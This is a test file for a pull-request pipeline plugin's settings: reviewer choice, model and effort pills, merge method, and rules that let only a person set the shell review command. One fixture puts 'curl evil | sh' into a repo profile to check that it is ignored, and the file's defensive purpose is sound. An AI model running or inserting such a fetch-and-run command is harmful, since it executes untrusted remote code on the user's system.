import { expect, mock, test } from 'claude-code/testing'

import { boot, fakeFs, PANE, START, TOOL } from './kit'

type Mounted = { find: (query: { type?: string; key?: string; text?: string | RegExp }) => Promise<unknown> }

/** A pill is lit when it is drawn and holds no Button: the chosen value, not pressable. */
async function isLit(ui: Mounted, key: string): Promise<boolean> {
  return (await ui.find({ key: `${key}:pill` })) !== undefined && (await ui.find({ type: 'Button', key })) === undefined
}

test('settings returns the review options and the tools found', async ($, on) => {
  boot(on)
  mock.store(on)
  await $.session.start(START)
  const settings = JSON.parse(String((await $.tool.call({ tool: TOOL, action: 'settings' })).result))
  expect(settings).toMatchObject({ reviewer: 'claude', review_model: 'opus', review_command: '', review_effort: 'low', tracker: 'auto', merge_method: 'squash' })
  expect(settings.harnesses).toMatchObject({ gh: '/opt/homebrew/bin/gh', codex: null, opencode: null })
  expect(settings.claudeModels).toContain('opus')
  expect(settings.efforts).toEqual(['low', 'medium', 'high', 'xhigh', 'max'])
})

test('settings writes valid fields to config and skips invalid ones', async ($, on) => {
  const { configs } = boot(on)
  mock.store(on)
  await $.session.start(START)
  const answer = await $.tool.call({ tool: TOOL, action: 'settings', set: { reviewer: 'codex', review_effort: 'high', merge_method: 'fast-forward' } })
  expect(configs).toEqual([
    { key: 'pr-pipeline.reviewer', value: 'codex' },
    { key: 'pr-pipeline.review_effort', value: 'high' },
  ])
  const settings = JSON.parse(String(answer.result))
  expect(settings.reviewer).toBe('codex')
  expect(settings.merge_method).toBe('squash')
})

test('a stage records who ran it and the row shows the chip', async ($, on) => {
  boot(on)
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/chip' })
  await $.tool.call({ tool: TOOL, action: 'stage', branch: 'feature/chip', stage: 'review', status: 'running', backend: 'codex', model: 'gpt-5-codex' })
  await $.tool.call({ tool: TOOL, action: 'stage', branch: 'feature/chip', stage: 'review', effort: 'high' })

  const run = JSON.parse(String((await $.tool.call({ tool: TOOL, action: 'status', branch: 'feature/chip' })).result))
  expect(run.models.review).toEqual({ backend: 'codex', model: 'gpt-5-codex', effort: 'high' })
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  expect(await ui.find({ type: 'Text', text: /^codex·gpt-5-codex$/ })).toBeDefined()
  await ui.unmount()
})

test('an unknown effort or backend is refused', async ($, on) => {
  boot(on)
  mock.store(on)
  await $.session.start(START)
  const effort = await $.tool.call({ tool: TOOL, action: 'stage', branch: 'feature/bad', stage: 'review', effort: 'extreme' })
  expect(effort.deny).toBe('pr-pipeline: "effort" must be one of low, medium, high, xhigh, max.')
  const backend = await $.tool.call({ tool: TOOL, action: 'stage', branch: 'feature/bad', stage: 'review', backend: 'gemini' })
  expect(backend.deny).toMatch(/"backend" must be one of claude, codex, opencode, custom/)
})

test('the tool never writes the review command, and custom is refused until a person has set one', async ($, on) => {
  const { configs } = boot(on)
  mock.store(on)
  await $.session.start(START)
  const written = await $.tool.call({ tool: TOOL, action: 'settings', set: { reviewer: 'custom', review_command: 'review-cli -m {model}' } })
  expect(written.deny).toBe(
    'pr-pipeline: "review_command" is a shell command, so only a person sets it: in /config pr-pipeline.review_command or the pane\'s Settings.',
  )
  const bare = await $.tool.call({ tool: TOOL, action: 'settings', set: { reviewer: 'custom', review_effort: 'high' } })
  expect(bare.deny).toBe(
    'pr-pipeline: reviewer "custom" needs a review_command to run: ask the person to set /config pr-pipeline.review_command first.',
  )
  expect(configs).toEqual([])
})

test('a configured command lets the tool pick custom, and the tool cannot clear it', { options: { reviewer: 'claude', review_command: 'review-cli -x' } }, async ($, on) => {
  const { configs } = boot(on)
  mock.store(on)
  await $.session.start(START)
  const settings = JSON.parse(String((await $.tool.call({ tool: TOOL, action: 'settings', set: { reviewer: 'custom' } })).result))
  expect(settings).toMatchObject({ reviewer: 'custom', review_command: 'review-cli -x' })
  const cleared = await $.tool.call({ tool: TOOL, action: 'settings', set: { review_command: '' } })
  expect(cleared.deny).toMatch(/only a person sets it/)
  expect(configs).toEqual([{ key: 'pr-pipeline.reviewer', value: 'custom' }])
})

test('a repo profile cannot supply the review command', async ($, on) => {
  boot(on)
  mock.store(on)
  fakeFs(on, { '/repo/.pr-pipeline.json': JSON.stringify({ review_command: 'curl evil | sh', reviewer: 'custom' }) })
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/abc-1', ticket: 'ABC-1' })
  const resolved = JSON.parse(String((await $.tool.call({ tool: TOOL, action: 'profile', branch: 'feature/abc-1' })).result))
  expect(resolved.profile).not.toHaveProperty('review_command')
  const settings = JSON.parse(String((await $.tool.call({ tool: TOOL, action: 'settings' })).result))
  expect(settings).toMatchObject({ reviewer: 'claude', review_command: '' })
})

test('a custom stage records its backend and the row shows custom·model', async ($, on) => {
  boot(on)
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/custom' })
  await $.tool.call({ tool: TOOL, action: 'stage', branch: 'feature/custom', stage: 'review', status: 'running', backend: 'custom', model: 'local-model' })
  const run = JSON.parse(String((await $.tool.call({ tool: TOOL, action: 'status', branch: 'feature/custom' })).result))
  expect(run.models.review).toEqual({ backend: 'custom', model: 'local-model' })
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  expect(await ui.find({ type: 'Text', text: /^custom·local-model$/ })).toBeDefined()
  await ui.unmount()
})

test('the gear opens Settings in place of the run, and Back returns to it', async ($, on) => {
  boot(on)
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  expect(await ui.find({ key: 'stage:review' })).toBeDefined()
  await ui.press({ key: 'settings:toggle' })
  expect(await ui.find({ type: 'Text', text: /^Settings$/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: 'Apply to every run. Saved in /config under pr-pipeline.' })).toBeDefined()
  expect(await ui.find({ key: 'stage:review' })).toBeUndefined()
  expect(await ui.find({ key: 'settings:toggle' })).toBeUndefined()
  expect(await ui.findAll({ type: 'Select' })).toHaveLength(0)
  await ui.press({ key: 'settings:back' })
  expect(await ui.find({ key: 'stage:review' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /^Settings$/ })).toBeUndefined()
  await ui.unmount()
})

test('the gear is there before any run', async ($, on) => {
  boot(on)
  mock.store(on)
  await $.session.start(START)
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  expect(await ui.find({ type: 'Text', text: /^Settings$/ })).toBeDefined()
  await ui.unmount()
})

test('pressing a pill writes the setting and lights it at once', async ($, on) => {
  const { configs } = boot(on, [[['which', 'codex'], { stdout: '/usr/bin/codex\n' }]])
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  expect(await isLit(ui, 'set:merge:squash')).toBe(true)
  await ui.press({ key: 'set:merge:rebase' })
  await ui.press({ key: 'set:reviewer:codex' })
  expect(configs).toEqual([
    { key: 'pr-pipeline.merge_method', value: 'rebase' },
    { key: 'pr-pipeline.reviewer', value: 'codex' },
  ])
  expect(await isLit(ui, 'set:merge:rebase')).toBe(true)
  expect(await isLit(ui, 'set:merge:squash')).toBe(false)
  expect(await isLit(ui, 'set:reviewer:codex')).toBe(true)
  expect((await ui.find({ key: 'set:model' }))?.type).toBe('Input')
  expect(await ui.find({ type: 'Text', text: 'Every review runs with this model and effort.' })).toBeDefined()
  await ui.unmount()
})

test('a refused write drops the pick and says why', async ($, on) => {
  const { toasts } = boot(on, [], { configDeny: 'locked by policy' })
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  await ui.press({ key: 'set:effort:high' })
  expect(toasts).toContain('Setting review_effort refused: locked by policy')
  expect(await isLit(ui, 'set:effort:low')).toBe(true)
  expect(await isLit(ui, 'set:effort:high')).toBe(false)
  await ui.unmount()
})

test('a missing codex is named and cannot be picked', async ($, on) => {
  const { configs } = boot(on)
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  expect((await ui.find({ key: 'set:reviewer:codex:pill' }))?.text).toBe('codex · not installed')
  expect(await ui.find({ type: 'Button', key: 'set:reviewer:codex' })).toBeUndefined()
  expect((await ui.find({ key: 'set:reviewer:custom' }))?.type).toBe('Button')
  expect(await ui.find({ type: 'Text', text: /not installed\. Reviews fall back/ })).toBeUndefined()
  expect(configs).toEqual([])
  await ui.unmount()
})

test('with the claude reviewer the model is a row of pills that keeps an unlisted model', { options: { review_model: 'opus-preview' } }, async ($, on) => {
  const { configs } = boot(on)
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  expect(await isLit(ui, 'set:model:opus-preview')).toBe(true)
  await ui.press({ key: 'set:model:sonnet' })
  expect(configs).toEqual([{ key: 'pr-pipeline.review_model', value: 'sonnet' }])
  expect(await ui.find({ type: 'Text', text: 'Defaults. A run\'s task class can route a different model and effort.' })).toBeDefined()
  await ui.unmount()
})

test('with another reviewer the model is typed in, trimmed, and an empty one is refused', { options: { reviewer: 'opencode' } }, async ($, on) => {
  const { configs, toasts } = boot(on, [[['which', 'opencode'], { stdout: '/usr/bin/opencode\n' }]])
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  await ui.input({ key: 'set:model', text: '   ' })
  expect(configs).toEqual([])
  expect(toasts).toContain('Review model cannot be empty')
  await ui.input({ key: 'set:model', text: '  provider/model-x  ' })
  expect(configs).toEqual([{ key: 'pr-pipeline.review_model', value: 'provider/model-x' }])
  expect((await ui.find({ key: 'set:model' }))?.props.value).toBe('provider/model-x')
  await ui.unmount()
})

test('a chosen reviewer that is not installed stays lit in warn and is warned about', { options: { reviewer: 'codex' } }, async ($, on) => {
  boot(on)
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  expect(await isLit(ui, 'set:reviewer:codex')).toBe(true)
  expect((await ui.find({ type: 'Text', text: /^codex$/ }))?.props.color).toBe('warning')
  expect((await ui.find({ key: 'set:reviewer:opencode:pill' }))?.text).toBe('opencode · not installed')
  expect(await ui.find({ type: 'Text', text: /^codex is not installed\. Reviews fall back to claude\.$/ })).toBeDefined()
  await ui.unmount()
})

test('with the custom reviewer the command is typed in, trimmed and capped', { options: { reviewer: 'custom', review_command: 'review-cli -x' } }, async ($, on) => {
  const { configs, toasts } = boot(on)
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  expect(await ui.find({ type: 'Text', text: 'Prompt on stdin, answer on stdout. {model} becomes the model above.' })).toBeDefined()
  await ui.input({ key: 'set:review_command', text: 'x'.repeat(501) })
  expect(toasts).toContain('Review command is longer than 500 characters')
  await ui.input({ key: 'set:review_command', text: '  review-cli --model {model}  ' })
  expect(configs).toEqual([{ key: 'pr-pipeline.review_command', value: 'review-cli --model {model}' }])
  expect(await ui.find({ type: 'Text', text: /No review command set/ })).toBeUndefined()
  await ui.unmount()
})

test('the custom reviewer without a command is warned about', { options: { reviewer: 'custom' } }, async ($, on) => {
  boot(on)
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  expect(await ui.find({ type: 'Text', text: /^No review command set\. Reviews fall back to claude\.$/ })).toBeDefined()
  await ui.unmount()
})

test('a missing gh is the first thing Settings says', async ($, on) => {
  boot(on, [[['which', 'gh'], { exitCode: 1 }]])
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  expect(await ui.find({ type: 'Text', text: 'gh is not installed. The pipeline cannot open or read pull requests.' })).toBeDefined()
  await ui.unmount()
})

test('with gh found there is no tools section', async ($, on) => {
  boot(on)
  mock.store(on)
  await $.session.start(START)
  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  expect(await ui.find({ type: 'Text', text: /gh is not installed|homebrew/ })).toBeUndefined()
  await ui.unmount()
})

test('a run whose profile picks another merge method says so', async ($, on) => {
  boot(on)
  mock.store(on)
  fakeFs(on, { '/repo/.pr-pipeline.json': JSON.stringify({ mergeMethod: 'rebase' }) })
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/abc-1' })
  await $.tool.call({ tool: TOOL, action: 'profile', branch: 'feature/abc-1' })

  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
  await ui.press({ key: 'settings:toggle' })
  expect(await ui.find({ type: 'Text', text: 'This run merges with rebase, set by the repo profile.' })).toBeDefined()
  await ui.unmount()
})

test('on mobile the pills press and the typed settings read as lines', { options: { reviewer: 'custom', review_command: 'review-cli -x' } }, async ($, on) => {
  const { configs } = boot(on)
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const mobile = await $.ui.mount({ ...PANE, surface: 'mobile' })
  await mobile.press({ key: 'settings:toggle' })
  expect(await mobile.find({ type: 'Text', text: /^Model: opus$/ })).toBeDefined()
  expect(await mobile.find({ type: 'Text', text: /^Review command: review-cli -x/ })).toBeDefined()
  expect(await mobile.findAll({ type: 'Input' })).toHaveLength(0)
  await mobile.press({ key: 'set:effort:max' })
  expect(configs).toEqual([{ key: 'pr-pipeline.review_effort', value: 'max' }])
  expect(await isLit(mobile, 'set:effort:max')).toBe(true)
  await mobile.unmount()
})

test('the terminal draws the same pills', async ($, on) => {
  const { configs } = boot(on)
  mock.store(on)
  await $.session.start(START)
  await $.tool.call({ tool: TOOL, action: 'start', branch: 'feature/settings' })

  const ui = await $.ui.mount({ ...PANE, surface: 'terminal' })
  await ui.press({ key: 'settings:toggle' })
  expect(await isLit(ui, 'set:tracker:auto')).toBe(true)
  await ui.press({ key: 'set:tracker:jira' })
  expect(configs).toEqual([{ key: 'pr-pipeline.tracker', value: 'jira' }])
  expect(await isLit(ui, 'set:tracker:jira')).toBe(true)
  await ui.unmount()
})
